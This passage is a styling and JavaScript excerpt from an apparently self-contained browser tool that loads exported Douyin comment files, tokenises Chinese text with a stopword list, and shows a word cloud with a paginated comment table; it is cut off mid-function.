.input:hover { border-color: var(--line-strong); }\n\n.muted { color: var(--muted); }\n.small { font-size: 13px; }\n.meta { color: var(--meta); font-size: 13px; }\ncode { font-family: var(--mono); background: var(--surface-2); border: 1px solid var(--line); padding: 1px 5px; border-radius: 4px; font-size: 13px; color: var(--text); }\n.hidden { display: none !important; }\n.inline { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }\n\n/* ---------- 外壳 ---------- */\n.topbar {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  gap: 16px;\n  padding: 22px 28px 14px;\n  flex-wrap: wrap;\n}\n.brand { display: flex; align-items: center; gap: 11px; min-width: 0; }\n.brand .mark {\n  width: 30px; height: 30px; flex: 0 0 30px;\n  color: var(--accent);\n}\n.brand .shell-id { display: flex; flex-direction: column; gap: 2px; min-width: 0; }\n.brand h1 { font-size: 20px; line-height: 1.25; margin: 0; font-weight: 600; letter-spacing: -.01em; color: var(--ink); }\n.brand .scope { margin: 0; font-size: 13px; color: var(--meta); }\n.actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }\n\n/* ---------- KPI：一格，用线切分 ---------- */\n.kpis {\n  display: grid;\n  grid-auto-flow: column;\n  grid-auto-columns: 1fr;\n  margin: 0 28px 16px;\n  background: var(--surface);\n  border: 1px solid var(--line);\n  border-radius: var(--r);\n  overflow: hidden;\n}\n.kpis:empty { display: none; }\n.kpi { padding: 13px 18px 14px; min-width: 0; }\n.kpi + .kpi { box-shadow: inset 1px 0 0 var(--line); }\n.kpi .k { font-size: 13px; color: var(--meta); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }\n.kpi .v { margin-top: 4px; font-size: 24px; line-height: 1.15; font-weight: 500; color: var(--ink); letter-spacing: -.01em; }\n.kpi .v small { font-size: 13px; font-weight: 400; color: var(--meta); margin-left: 5px; letter-spacing: 0; }\n@media (max-width: 860px) {\n  .kpis { grid-auto-flow: row; grid-template-columns: repeat(3, 1fr); }\n  .kpi + .kpi { box-shadow: inset 1px 0 0 var(--line); }\n}\n\n/* ---------- 主网格 ---------- */\n.grid {\n  display: grid;\n  grid-template-columns: minmax(0, 1fr) 322px;\n  gap: 14px;\n  padding: 0 28px 14px;\n  align-items: stretch;\n}\n@media (max-width: 1080px) {\n  .grid { grid-template-columns: minmax(0, 1fr); }\n  .side { position: static; }\n}\n\n.panel {\n  background: var(--surface);\n  border: 1px solid var(--line);\n  border-radius: var(--r);\n  min-width: 0;\n}\n.panel-head {\n  display: flex;\n  align-items: center;\n  justify-content: space-between;\n  gap: 12px;\n  padding: 12px 16px;\n  border-bottom: 1px solid var(--line);\n  flex-wrap: wrap;\n}\n.panel-head .panel-title { display: flex; align-items: baseline; gap: 10px; min-width: 0; }\n.panel-head h2 { font-size: 16px; font-weight: 600; margin: 0; color: var(--ink); letter-spacing: -.005em; }\n.panel-head .panel-sub { font-size: 13px; color: var(--meta); }\n.panel-head.sub { border-bottom: 0; padding: 12px 16px 2px; }\n.panel-head.sub h2 { font-size: 13px; font-weight: 600; color: var(--muted); }\n\n/* ---------- 词云 ---------- */\n.cloud-panel { display: flex; flex-direction: column; position: relative; height: 100%; }\n.cloud {\n  position: relative;\n  flex: 1 1 auto;\n  min-height: clamp(340px, 48vh, 500px);\n  margin: 0;\n  overflow: hidden;\n  background: var(--bg);\n  contain: layout paint;\n}\n.cloud-empty, .empty {\n  position: absolute; inset: 0;\n  pointer-events: none;\n  display: flex; flex-direction: column; align-items: center; justify-content: center;\n  gap: 6px; text-align: center; padding: 28px; color: var(--muted);\n}\n.empty .empty-mark { color: var(--line-strong); margin-bottom: 6px; }\n.empty strong { color: var(--text); font-weight: 600; font-size: 16px; }\n.empty p { margin: 0; font-size: 13px; color: var(--meta); line-height: 1.6; }\n.empty .btn { pointer-events: auto; margin-top: 12px; }\n.cloud-foot {\n  display: flex; align-items: center; justify-content: space-between; gap: 12px;\n  padding: 9px 16px; border-top: 1px solid var(--line);\n  font-size: 12px; color: var(--meta); flex-wrap: wrap;\n}\n.cloud-foot .swatch { display: inline-block; width: 8px; height: 8px; border-radius: 2px; background: var(--accent); vertical-align: 0; margin-right: 5px; }\n.cloud-foot .swatch.grey { background: #b9b9be; }\n.cloud-foot .swatch.mono { background: #8e8e94; }\n\n.cw {\n  position: absolute;\n  left: 0; top: 0;\n  white-space: nowrap;\n  cursor: pointer;\n  user-select: none;\n  line-height: 1;\n  transform-origin: center center;\n  transition: transform .14s ease-out, color .14s, opacity .14s;\n  will-change: transform;\n}\n.cw:hover, .cw.hot { transform: scale(1.22); z-index: 30; color: var(--ink) !important; }\n.cw.dim { opacity: .22; }\n\n/* ---------- 侧栏 ---------- */\n.side { position: sticky; top: 12px; display: flex; flex-direction: column; align-self: stretch; max-height: calc(100vh - 24px); }\n.word-list { list-style: none; margin: 0; padding: 6px 8px; flex: 0 0 auto; height: 322px; max-height: 322px; overflow: auto; }\n.word-list li {\n  display: grid;\n  grid-template-columns: 22px minmax(0, 1fr) auto;\n  align-items: center;\n  gap: 10px;\n  padding: 6px 8px;\n  border-radius: var(--r-ctl);\n  cursor: pointer;\n  font-size: 13px;\n  color: var(--text);\n}\n.word-list li:hover { background: var(--surface-2); color: var(--ink); }\n.word-list li .rank { color: var(--meta); font-size: 11px; text-align: right; }\n.word-list li .w { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }\n.word-list li .n { color: var(--meta); font-size: 13px; text-align: right; }\n.word-list li .mark { width: 3px; height: 14px; border-radius: 1px; background: var(--accent); }\n.side-body { padding: 8px 16px 16px; display: flex; flex-direction: column; gap: 10px; border-top: 1px solid var(--line); }\n.field { display: flex; flex-direction: column; gap: 5px; font-size: 13px; color: var(--meta); }\n.field .select { width: 100%; }\n.check { display: flex; align-items: center; gap: 8px; font-size: 13px; color: var(--text); cursor: pointer; }\n.check input { accent-color: var(--ink); width: 14px; height: 14px; }\n\n/* ---------- 表格 ---------- */\n.table-panel { margin: 0 28px; }\n.table-wrap { position: relative; overflow: auto; height: 620px; min-height: 420px; max-height: 620px; }\ntable { width: 100%; border-collapse: collapse; table-layout: fixed; }\nthead th {\n  position: sticky; top: 0; z-index: 2;\n  background: var(--surface);\n  text-align: left;\n  font-size: 12px;\n  font-weight: 500;\n  color: var(--meta);\n  padding: 10px 14px;\n  border-bottom: 1px solid var(--line);\n}\ntbody td {\n  padding: 11px 14px;\n  border-bottom: 1px solid #1e1e21;\n  vertical-align: top;\n  font-size: 13px;\n  color: var(--text);\n}\ntbody tr:last-child td { border-bottom: 0; }\ntbody tr:hover { background: #17171a; }\n.col-text { width: auto; }\n.col-user { width: 176px; }\n.col-num { width: 76px; text-align: right; }\n.col-ip { width: 84px; }\n.col-time { width: 132px; white-space: nowrap; }\ntd.muted { white-space: nowrap; }\n.col-level { width: 68px; }\ntd.num { text-align: right; color: var(--ink); }\ntd .txt { white-space: pre-wrap; word-break: break-word; color: var(--ink); }\ntd .txt .hl { background: #4a3a17; color: #f0cd8f; border-radius: 2px; padding: 0 2px; }\n.video-link { color: var(--meta); text-decoration: none; }\n.video-link:hover { color: var(--text); text-decoration: underline; }\n.badges { display: inline-flex; gap: 5px; margin-left: 6px; vertical-align: 1px; }\n.badge {\n  font-size: 11px;\n  line-height: 1.5;\n  border-radius: 4px;\n  padding: 0 5px;\n  border: 1px solid var(--line);\n  color: var(--meta);\n  white-space: nowrap;\n}\n.badge.hot { color: #f0cd8f; border-color: #4a3a17; background: var(--accent-dim); }\n.badge.reply { color: #c8c8cd; border-color: #333338; background: #1c1c20; }\n.badge.fold { color: var(--meta); }\n.user-cell { display: flex; align-items: center; gap: 9px; min-width: 0; }\n.avatar {\n  width: 26px; height: 26px; border-radius: 50%;\n  flex: 0 0 26px;\n  display: flex; align-items: center; justify-content: center;\n  font-size: 11px; font-weight: 600;\n  background: #232327;\n  color: #c9c9ce;\n}\n.user-meta { min-width: 0; }\n.user-name {\n  display: block;\n  color: var(--text);\n  text-decoration: none;\n  overflow: hidden; text-overflow: ellipsis; white-space: nowrap;\n  max-width: 132px;\n}\na.user-name:hover { color: var(--ink); text-decoration: underline; }\n.user-name.nolink { color: var(--meta); cursor: default; }\n.user-sub { font-family: var(--mono); font-size: 12px; color: var(--meta); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 132px; }\n.empty.small { position: static; padding: 28px; }\n\n.pager { display: flex; align-items: center; justify-content: center; gap: 4px; padding: 12px; flex-wrap: wrap; }\n.pager button {\n  min-width: 30px;\n  padding: 4px 8px;\n  border-radius: var(--r-ctl);\n  border: 1px solid transparent;\n  background: transparent;\n  color: var(--muted);\n  font: 500 12px/1.4 var(--font);\n  cursor: pointer;\n}\n.pager button:hover { color: var(--ink); background: var(--surface-2); }\n.pager button.on { background: var(--ink); border-color: var(--ink); color: #111113; font-weight: 600; }\n.pager button:disabled { opacity: .32; cursor: not-allowed; }\n.pager .info { color: var(--meta); font-size: 13px; margin: 0 8px; }\n\n.foot {\n  display: flex; justify-content: space-between; gap: 12px; flex-wrap: wrap;\n  padding: 16px 30px 0; color: var(--meta); font-size: 12px;\n}\n\n/* ---------- 悬浮框（浮层才给阴影） ---------- */\n.tooltip {\n  position: fixed;\n  z-index: 100;\n  max-width: 380px;\n  background: var(--surface-2);\n  border: 1px solid var(--line-strong);\n  border-radius: var(--r);\n  box-shadow: var(--shadow-float);\n  padding: 12px 14px;\n  pointer-events: auto;\n}\n.tooltip .tt-word { font-size: 15px; font-weight: 600; color: var(--ink); }\n.tooltip .tt-meta { color: var(--meta); font-size: 13px; margin: 3px 0 9px; }\n.tt-comments { display: flex; flex-direction: column; gap: 0; }\n.tt-item {\n  display: block; text-decoration: none; color: inherit;\n  padding: 8px 0;\n  border-top: 1px solid var(--line);\n}\n.tt-item:first-child { border-top: 0; }\n.tt-item:hover { background: #1f1f23; }\n.tt-item .tt-txt { font-size: 13px; color: var(--text); display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }\n.tt-item .tt-user { font-size: 13px; color: var(--meta); margin-top: 3px; }\n.tt-item .tt-user .go { color: var(--text); text-decoration: underline; text-underline-offset: 2px; }\n.tt-more { margin-top: 8px; padding-top: 9px; border-top: 1px solid var(--line); font-size: 13px; color: var(--text); cursor: pointer; user-select: none; }\n.tt-more:hover { color: var(--ink); text-decoration: underline; }\n\n/* ---------- 抽屉 ---------- */\n.drawer {\n  position: fixed;\n  right: 0; top: 0; bottom: 0;\n  width: min(560px, 94vw);\n  z-index: 90;\n  background: var(--surface);\n  border-left: 1px solid var(--line-strong);\n  box-shadow: -18px 0 44px rgba(0, 0, 0, .45);\n  display: flex;\n  flex-direction: column;\n  animation: slideIn .16s ease-out;\n}\n@keyframes slideIn { from { transform: translateX(18px); opacity: .7; } to { transform: none; opacity: 1; } }\n.drawer-head {\n  display: flex; align-items: flex-start; justify-content: space-between; gap: 12px;\n  padding: 16px 18px 13px; border-bottom: 1px solid var(--line);\n}\n.drawer-head h3 { margin: 0 0 3px; font-size: 16px; font-weight: 600; color: var(--ink); }\n.drawer-head p { margin: 0; }\n.drawer-body { flex: 1 1 auto; overflow: auto; padding: 4px 14px 8px; }\n.dc { padding: 12px 4px; border-bottom: 1px solid var(--line); }\n.dc:last-child { border-bottom: 0; }\n.dc-head { display: flex; align-items: center; justify-content: space-between; gap: 10px; margin-bottom: 7px; }\n.dc-user { display: flex; align-items: center; gap: 9px; min-width: 0; }\n.dc-text { white-space: pre-wrap; word-break: break-word; font-size: 13px; color: var(--ink); }\n.dc-meta { display: flex; gap: 12px; flex-wrap: wrap; color: var(--meta); font-size: 13px; margin-top: 8px; }\n.dc-meta .spacer { flex: 1 1 auto; }\n.dc-go {\n  color: var(--text); font-size: 12px; text-decoration: none; white-space: nowrap;\n  border: 1px solid var(--line-strong); padding: 3px 9px; border-radius: var(--r-ctl);\n}\n.dc-go:hover { color: var(--ink); border-color: #55555c; background: var(--surface-2); }\n.dc-go.off { color: var(--meta); border-color: var(--line); cursor: default; }\n.drawer-foot {\n  display: flex; justify-content: space-between; gap: 10px;\n  padding: 12px 18px; border-top: 1px solid var(--line);\n}\n.drawer-foot .btn { flex: 1 1 auto; }\n\n/* ---------- toast ---------- */\n.toast {\n  position: fixed;\n  left: 50%; bottom: 28px;\n  transform: translateX(-50%);\n  background: var(--surface-2);\n  border: 1px solid var(--line-strong);\n  color: var(--text);\n  padding: 9px 16px;\n  border-radius: var(--r);\n  font-size: 13px;\n  z-index: 150;\n  box-shadow: var(--shadow-float);\n  max-width: min(720px, 92vw);\n}\n\n/* ---------- 加载骨架屏（请求/解析时占位，避免白屏与跳动） ---------- */\nbody.is-loading #cloud .cw,\nbody.is-loading #cloudEmpty,\nbody.is-loading #tbody,\nbody.is-loading #tableEmpty,\nbody.is-loading #wordList li:not(.sk-li) { visibility: hidden; }\nbody.is-loading .kpi .v { color: transparent; position: relative; }\nbody.is-loading .kpi .v::after {\n  content: '';\n  position: absolute;\n  left: 0;\n  top: 50%;\n  transform: translateY(-50%);\n  width: 66px;\n  height: 22px;\n  border-radius: 4px;\n  background: #2e2e34;\n  animation: skPulse 1.15s ease-in-out infinite;\n}\n.sk-cloud {\n  position: absolute;\n  inset: 14px;\n  display: none;\n}\n.sk-cloud i {\n  position: absolute;\n  display: block;\n  border-radius: 12px;\n  background: #26262c;\n  animation: skBlockPulse 1.5s ease-in-out infinite;\n}\n.sk-table {\n  position: absolute;\n  inset: 0;\n  padding: 16px 18px;\n  display: none;\n  flex-direction: column;\n  gap: 15px;\n  background: var(--surface);\n}\n.sk-row { display: flex; gap: 16px; align-items: center; }\n.sk-row i {\n  height: 12px;\n  border-radius: 3px;\n  background: #2e2e34;\n  animation: skPulse 1.15s ease-in-out infinite;\n}\n@keyframes skBlockPulse { 0%, 100% { opacity: 0.35 } 50% { opacity: 0.75 } }\n@keyframes skPulse { 0%, 100% { opacity: 0.5 } 50% { opacity: 1 } }\nbody.is-loading .sk-cloud { display: block; }\nbody.is-loading .sk-table { display: flex; }\n#wordList li.sk-li { opacity: 1; display: block; padding: 4px 0; }\nbody.is-loading .kpi .v * { color: transparent; }\n#wordList li.sk-li i {\n  display: block;\n  height: 12px;\n  border-radius: 3px;\n  background: #2e2e34;\n  animation: skPulse 1.15s ease-in-out infinite;\n}\n.sk-cloud[hidden],\n.sk-table[hidden] { display: none !important; }\n\n/* ---------- 空状态：布局保持不变，只把内容变淡（避免切换数据时整页重排） ---------- */\nbody.is-empty .cloud-panel { min-height: 460px; }\nbody.is-empty .side .word-list,\nbody.is-empty .side .filters,\nbody.is-empty .table-wrap tbody { opacity: 0.55; }\n\n/* 滚动条 */\n::-webkit-scrollbar { width: 10px; height: 10px; }\n::-webkit-scrollbar-thumb { background: #2c2c31; border-radius: 8px; border: 2px solid var(--surface); }\n::-webkit-scrollbar-thumb:hover { background: #3a3a40; }\n::-webkit-scrollbar-track { background: transparent; }\n", // 词云页 styles.css
  js: "/* 评论分析台 · 词云 + 评论表（纯前端，无依赖）\n * 数据来源：抖音评论采集插件/扩展导出的 JSON / CSV（可整目录批量载入）\n * 隐私：全部在本机浏览器内处理，不发任何网络请求\n */\n(function () {\n  'use strict';\n\n  /* ===================== 工具 ===================== */\n  const $ = (sel, root) => (root || document).querySelector(sel);\n  const $$ = (sel, root) => Array.from((root || document).querySelectorAll(sel));\n  const PROFILE_BASE = 'https://www.douyin.com/user/';\n\n  const esc = (s) => String(s == null ? '' : s)\n    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;').replace(/'/g, '&#39;');\n\n  const fmtNum = (n) => {\n    n = Number(n) || 0;\n    if (n >= 100000000) return (n / 100000000).toFixed(1).replace(/\\.0$/, '') + ' 亿';\n    if (n >= 10000) return (n / 10000).toFixed(1).replace(/\\.0$/, '') + ' 万';\n    return String(n);\n  };\n\n  const pad2 = (n) => (n < 10 ? '0' + n : String(n));\n  const fmtTime = (ts) => {\n    if (!ts) return '';\n    const d = new Date(Number(ts) * (String(ts).length > 10 ? 1 : 1000));\n    if (isNaN(d.getTime())) return '';\n    return `${d.getFullYear()}-${pad2(d.getMonth() + 1)}-${pad2(d.getDate())} ${pad2(d.getHours())}:${pad2(d.getMinutes())}`;\n  };\n  const fmtTimeShort = (ts) => {\n    const s = fmtTime(ts);\n    return s ? s.slice(5) : '';\n  };\n\n  const profileOf = (user) => {\n    const sec = user && user.secUid ? String(user.secUid).trim() : '';\n    return sec ? PROFILE_BASE + encodeURIComponent(sec) : '';\n  };\n\n  const videoUrl = (videoId) => {\n    const id = String(videoId || '').trim();\n    if (!id) return '';\n    const v = state.videos.get(id);\n    if (v && v.url) return v.url;\n    return 'https://www.douyin.com/video/' + encodeURIComponent(id);\n  };\n\n  let toastTimer = null;\n  function toast(msg) {\n    const el = $('#toast');\n    el.textContent = msg;\n    el.classList.remove('hidden');\n    clearTimeout(toastTimer);\n    toastTimer = setTimeout(() => el.classList.add('hidden'), 2200);\n  }\n\n  function debounce(fn, ms) {\n    let t = null;\n    return function () {\n      const args = arguments, self = this;\n      clearTimeout(t);\n      t = setTimeout(() => fn.apply(self, args), ms);\n    };\n  }\n\n  const initials = (name) => {\n    const s = String(name || '').trim();\n    if (!s) return '?';\n    return s.slice(0, 1).toUpperCase();\n  };\n\n  // 每个用户一个稳定的淡色头像底（按昵称/ID 散列取色），只用淡色、不参与数据配色\n  const avatarHue = (user) => {\n    const key = String((user && (user.secUid || user.uid || user.nickname)) || '');\n    let h = 0;\n    for (let i = 0; i < key.length; i++) h = (h * 31 + key.charCodeAt(i)) % 360;\n    return h;\n  };\n  const avatarStyle = (user) => {\n    const h = avatarHue(user);\n    return `background:hsl(${h} 16% 18%);color:hsl(${h} 30% 78%)`;\n  };\n\n  /* ===================== 状态 ===================== */\n  const state = {\n    comments: [],              // 全部评论（已归一化、已去重）\n    videos: new Map(),         // videoId -> { id, title, url, collectedAt }\n    sources: [],               // 已载入文件名\n    filters: { videoId: '', search: '', onlyHasProfile: false, onlyTopLevel: false, onlyNonEmpty: false },\n    sort: 'digg',\n    page: 1,\n    pageSize: 50,\n    words: [],\n    wordMap: new Map(),        // word -> { word, count, cids:Set }\n    lastWord: '',\n    cloudReady: false,\n    hoverWord: '',\n  };\n\n  /* ===================== CSV 解析 ===================== */\n  function parseCsv(text) {\n    text = String(text || '').replace(/^\\uFEFF/, '');\n    const rows = [];\n    let row = [], field = '', inQuotes = false;\n    for (let i = 0; i < text.length; i++) {\n      const ch = text[i];\n      if (inQuotes) {\n        if (ch === '\"') {\n          if (text[i + 1] === '\"') { field += '\"'; i++; }\n          else inQuotes = false;\n        } else field += ch;\n      } else if (ch === '\"') {\n        inQuotes = true;\n      } else if (ch === ',') {\n        row.push(field); field = '';\n      } else if (ch === '\\r') {\n        if (text[i + 1] === '\\n') i++;\n        row.push(field); field = '';\n        rows.push(row); row = [];\n      } else if (ch === '\\n') {\n        row.push(field); field = '';\n        rows.push(row); row = [];\n      } else field += ch;\n    }\n    if (field.length || row.length) { row.push(field); rows.push(row); }\n    // 去掉首格为 # 的中文说明行 / 空行\n    return rows.filter((r) => {\n      if (!r.length) return false;\n      const first = String(r[0] == null ? '' : r[0]).trim();\n      if (first.startsWith('#')) return false;\n      if (r.every((c) => String(c == null ? '' : c).trim() === '')) return false;\n      return true;\n    });\n  }\n\n  function num(v) { const n = Number(String(v == null ? '' : v).trim()); return isFinite(n) ? n : 0; }\n\n  /* ===================== 归一化 ===================== */\n  function normalizeUser(u) {\n    u = u || {};\n    return {\n      nickname: String(u.nickname || '').trim() || '匿名用户',\n      uid: u.uid ? String(u.uid) : '',\n      secUid: u.sec_uid ? String(u.sec_uid) : (u.secUid ? String(u.secUid) : ''),\n      uniqueId: u.unique_id ? String(u.unique_id) : (u.uniqueId ? String(u.uniqueId) : ''),\n      shortId: u.short_id ? String(u.short_id) : (u.shortId ? String(u.shortId) : ''),\n    };\n  }\n\n  // v2.4：导出数据本来就带清洗后的文本（`text_clean`，去表情/@/#，扩展的 cleanText() 生成）。\n  // 分词优先用它；老数据/快照没有该字段时，再在 tokensOf() 里剥 [表情] 兜底。\n  function cleanForTokens(raw, text) {\n    const cleaned = String(raw.text_clean != null ? raw.text_clean : (raw.textClean != null ? raw.textClean : '')).trim();\n    if (cleaned) return cleaned;\n    return String(text || '');\n  }\n\n  function normalizeComment(raw, meta) {\n    raw = raw || {};\n    const text = String(raw.text != null ? raw.text : (raw.text_clean || raw.content || '')).trim();\n    const cid = String(raw.cid || raw.comment_id || '');\n    const user = normalizeUser(raw.user || {\n      nickname: raw.user_nickname, uid: raw.user_uid, sec_uid: raw.user_sec_uid,\n      unique_id: raw.user_unique_id, short_id: raw.user_short_id,\n    });\n    const videoId = String(raw.videoId || raw.video_id || meta.videoId || '');\n    return {\n      cid,\n      videoId,\n      videoTitle: meta.title || '',\n      text,\n      textClean: cleanForTokens(raw, text),\n      digg: num(raw.digg_count != null ? raw.digg_count : raw.digg),\n      replies: num(raw.reply_comment_total != null ? raw.reply_comment_total : raw.replies),\n      ip: String(raw.ip_label || ''),\n      createTime: num(raw.create_time),\n      createTimeStr: String(raw.create_time_str || fmtTime(raw.create_time) || ''),\n      isReply: raw.is_reply === true || String(raw.is_reply) === '1' || String(raw.is_reply).toLowerCase() === 'true' || num(raw.level) > 1,\n      level: num(raw.level) || 1,\n      isHot: raw.is_hot === true || String(raw.is_hot) === '1',\n      isFolded: raw.is_folded === true || String(raw.is_folded) === '1',\n      user,\n    };\n  }\n\n  /* ===================== 载入数据 ===================== */\n  function addComments(list) {\n    let added = 0;\n    const seen = new Set(state.comments.map((c) => c.videoId + '|' + c.cid));\n    for (const c of list) {\n      if (!c.text && !c.user.nickname) continue;\n      const key = c.videoId + '|' + c.cid;\n      if (c.cid && seen.has(key)) continue;\n      seen.add(key);\n      state.comments.push(c);\n      added++;\n    }\n    return added;\n  }\n\n  function ingestJson(text, fileName) {\n    let obj;\n    try { obj = JSON.parse(String(text).replace(/^\\uFEFF/, '')); }\n    catch (e) { toast('JSON 解析失败：' + fileName); return -1; }\n    let arr = null, meta = { videoId: '', title: '' };\n    if (Array.isArray(obj)) arr = obj;\n    else if (obj && Array.isArray(obj.comments)) {\n      arr = obj.comments;\n      meta.videoId = String(obj.videoId || obj.video_id || '');\n      meta.title = String(obj.title || '');\n    } else if (obj && obj.data && Array.isArray(obj.data.comments)) {\n      arr = obj.data.comments;\n    }\n    if (!arr) { toast('这个 JSON 里没有 comments 数组：' + fileName); return -1; }\n    if (meta.videoId) {\n      state.videos.set(meta.videoId, {\n        id: meta.videoId, title: meta.title || '视频 ' + meta.videoId.slice(-8),\n        url: obj.url || ('https://www.douyin.com/video/' + meta.videoId),\n        collectedAt: obj.collectedAt || '',\n      });\n    }\n    const list = arr.map((c) => normalizeComment(c, meta));\n    return addComments(list);\n  }\n\n  function ingestCsv(text, fileName) {\n    const rows = parseCsv(text);\n    if (!rows.length) { toast('CSV 是空的：' + fileName); return -1; }\n    const header = rows[0].map((h) => String(h || '').trim());\n    const idx = {};\n    header.forEach((h, i) => { idx[h] = i; });\n    if (idx.cid == null && idx.text == null) { toast('这不是评论导出 CSV：' + fileName); return -1; }\n    const hasVideoCol = idx.video_id != null;\n    let curMeta = { videoId: '', title: '' };\n    if (!hasVideoCol) {\n      // 单视频 CSV：从文件名里取 videoId\n      const m = String(fileName || '').match(/(\\d{15,25})/);\n      if (m) {\n        curMeta.videoId = m[1];\n        if (!state.videos.has(m[1])) {\n          state.videos.set(m[1], { id: m[1], title: '视频 ' + m[1].slice(-8), url: 'https://www.douyin.com/video/' + m[1], collectedAt: '' });\n        }\n      }\n    }\n    const get = (r, key) => (idx[key] != null ? r[idx[key]] : '');\n    const list = [];\n    for (let i = 1; i < rows.length; i++) {\n      const r = rows[i];\n      const vid = hasVideoCol ? String(get(r, 'video_id') || '').trim() : curMeta.videoId;\n      if (hasVideoCol && vid && !state.videos.has(vid)) {\n        state.videos.set(vid, { id: vid, title: '视频 ' + vid.slice(-8), url: 'https://www.douyin.com/video/' + vid, collectedAt: '' });\n      }\n      const meta = { videoId: vid, title: (state.videos.get(vid) || {}).title || '' };\n      list.push(normalizeComment({\n        cid: get(r, 'cid'),\n        text: get(r, 'text') || get(r, 'text_clean'),\n        text_clean: get(r, 'text_clean'),\n        digg_count: get(r, 'digg_count'),\n        reply_comment_total: get(r, 'reply_comment_total'),\n        ip_label: get(r, 'ip_label'),\n        create_time: get(r, 'create_time'),\n        create_time_str: get(r, 'create_time_str'),\n        is_reply: get(r, 'is_reply'),\n        level: get(r, 'level'),\n        is_hot: get(r, 'is_hot'),\n        is_folded: get(r, 'is_folded'),\n        user_nickname: get(r, 'user_nickname'),\n        user_uid: get(r, 'user_uid'),\n        user_sec_uid: get(r, 'user_sec_uid'),\n        user_unique_id: get(r, 'user_unique_id'),\n        user_short_id: get(r, 'user_short_id'),\n      }, meta));\n    }\n    return addComments(list);\n  }\n\n  async function loadFiles(fileList) {\n    const files = Array.from(fileList || []).filter((f) => /\\.(json|csv)$/i.test(f.name));\n    if (!files.length) { toast('没有找到 .json / .csv 文件'); return; }\n    setLoading(true);\n    let total = 0;\n    const names = [];\n    for (const f of files) {\n      try {\n        const text = await f.text();\n        const n = /\\.json$/i.test(f.name) ? ingestJson(text, f.name) : ingestCsv(text, f.name);\n        if (n >= 0) {\n          total += n;\n          names.push(f.name);\n        }\n      } catch (e) {\n        console.warn('读取失败', f.name, e);\n      }\n    }\n    state.sources = state.sources.concat(names);\n    updateScope();\n    updateEmptyState();\n    $('#btnClear').disabled = state.comments.length === 0;\n    if (total > 0) toast(`载入 ${total} 条评论（${names.length} 个文件）`);\n    else toast('没有新增评论（可能是重复文件）');\n    setLoading(false);\n    refreshAll();\n  }\n\n  /* ===================== 过滤 ===================== */\n  function filtered() {\n    const f = state.filters;\n    const q = f.search.trim().toLowerCase();\n    return state.comments.filter((c) => {\n      if (f.videoId && c.videoId !== f.videoId) return false;\n      if (f.onlyHasProfile && !profileOf(c.user)) return false;\n      if (f.onlyTopLevel && c.isReply) return false;\n      if (f.onlyNonEmpty && !c.text) return false;\n      if (q) {\n        const hay = (c.text + ' ' + c.user.nickname + ' ' + c.user.uniqueId + ' ' + c.ip).toLowerCase();\n        if (hay.indexOf(q) === -1) return false;\n      }\n      return true;\n    });\n  }\n\n  /* ===================== 分词 ===================== */\n  const STOPWORDS = new Set((\n    '的 了 是 在 我 你 他 她 它 们 这 那 有 和 就 都 也 又 还 要 会 能 可以 不是 没有 一个 这个 那个 ' +\n    '什么 怎么 为什么 因为 所以 但是 然后 而且 如果 就是 这样 那样 这么 那么 自己 我们 你们 他们 ' +\n    '她们 它们 人家 别人 大家 真的 真是 确实 其实 应该 可能 觉得 感觉 知道 看到 看过 听到 时候 ' +\n    '现在 之前 以后 一样 一直 已经 还是 只是 不过 有点 一点 一些 这些 那些 多少 几个 一次 一下 ' +\n    '评论 回复 视频 抖音 作者 楼主 主播 up 啊 吧 呢 吗 呀 哦 嗯 哈 啦 嘛 哇 呵 嘿 诶 哎 唉 么 ' +\n    '哇塞 哈哈哈 哈哈哈哈 呵呵 嘿嘿 666 233 999 111 1111 2333 555 干嘛 咋 咱 俺 啥 嘞 咯 嗷 呜 喵'\n  ).split(/\\s+/).filter(Boolean));\n\n  let segmenter = null;\n  try {\n    if (typeof Intl !== 'undefined' && Intl.Segmenter) segmenter = new Intl.Segmenter('zh-Hans', { granularity: 'word' });\n  } catch (e) { segmenter = null; }\n\n  function tokensOf(text) {\n    const out = [];\n    // v2.3：抖音表情是 [憨笑] [流泪] 这种方括号标签文本，直接分词会把标签名当成词（点进去只有一条「[悲伤]」）。\n    // 分词前先把方括号标签剥掉，纯表情评论因此不贡献任何关键词。\n    const s = String(text || '').replace(/\\[[^\\[\\]]{1,12}\\]/g, ' ');\n    if (!s.trim()) return out;\n    if (segmenter) {\n      for (const seg of segmenter.segment(s)) {\n        if (!seg.isWordLike) continue;\n        out.push(seg.segment);\n      }\n    } else {\n      // 兜底：中文取 2-gram，英文/数字按词\n      const parts = s.match(/[A-Za-z][A-Za-z0-9'+.-]*|\\d+(?:\\.\\d+)?|[\\u4e00-\\u9fff]+/g) || [];\n      for (const p of parts) {\n        if (/^[\\u4e00-\\u9fff]+$/.test(p)) {\n          if (p.length === 1) out.push(p);\n          else for (let i = 0; i + 2 <= p.length; i++) out.push(p.slice(i, i + 2));\n        } else out.push(p);\n      }\n    }\n    return out;\n  }\n\n  function cleanToken(w) {\n    let t = String(w || '').trim();\n    if (!t) return '';\n    t = t.replace(/[\\s\\u3000]+/g, '');\n    if (!t) return '';\n    if (/^[\\d.,%+\\-/:]+$/.test(t)) return '';\n    if (/^[A-Za-z]+$/.test(t)) t = t.toLowerCase();\n    if (t.length < 2) return '';\n    if (STOPWORDS.has(t.toLowerCase())) return '';\n    if (/^(.)\\1{2,}$/.test(t)) return '';       // 啊啊啊\n    return t;\n  }\n\n  function buildWords(comments) {\n    const map = new Map();\n    for (const c of comments) {\n      if (!c.text) continue;\n      const seen = new Set();\n      for (const raw of tokensOf(c.textClean || c.text)) {\n        const w = cleanToken(raw);\n        if (!w || seen.has(w)) continue;\n        seen.add(w);\n        let rec = map.get(w);\n        if (!rec) { rec = { word: w, count: 0, cids: new Set(), users: new Set() }; map.set(w, rec); }\n        rec.count++;\n        if (c.cid) rec.cids.add(c.cid);\n        rec.users.add(c.user.secUid || c.user.uid || c.user.nickname);\n      }\n    }\n    return Array.from(map.values()).sort((a, b) => b.count - a.count || a.word.localeCompare(b.word));\n  }\n\n  /* ===================== KPI ===================== */\n  function renderKpis(list) {\n    const users = new Set();\n    let digg = 0, hot = 0, topLevel = 0;\n    for (const c of 